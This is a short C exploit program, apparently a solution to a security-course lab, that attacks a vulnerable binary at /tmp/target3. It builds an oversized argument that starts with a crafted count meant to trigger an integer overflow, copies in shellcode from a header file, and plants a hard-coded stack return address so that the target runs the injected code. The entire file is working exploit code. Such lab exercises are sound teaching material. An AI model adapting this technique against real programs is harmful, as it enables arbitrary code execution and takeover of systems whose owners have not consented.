#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  args[1] = malloc(19200);
  int i,j;
  i = 0;

  memset(args[1],'A',19200);
  args[1][i++] = '2';
  args[1][i++] = '1';
  args[1][i++] = '4';
  args[1][i++] = '7';
  args[1][i++] = '4';
  args[1][i++] = '8';
  args[1][i++] = '4';
  args[1][i++] = '2';
  args[1][i++] = '4';
  args[1][i++] = '8';
  args[1][i++] = ',';

  for(i=i,j=0; j < strlen(shellcode); i++,j++) {
    args[1][i] = shellcode[j];
  }

  int x = 32*583;

  /*args[1][18675] = 0x68;
  args[1][18676] = 0xb3;
  args[1][18677] = 0xff;
  args[1][18678] = 0xbf;*/

  args[1][18679] = 0x50;
  args[1][18680] = 0x6a;
  args[1][18681] = 0xff;
  args[1][18682] = 0xbf;

  args[0] = TARGET;
  args[2] = NULL;
  env[0] = NULL;
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}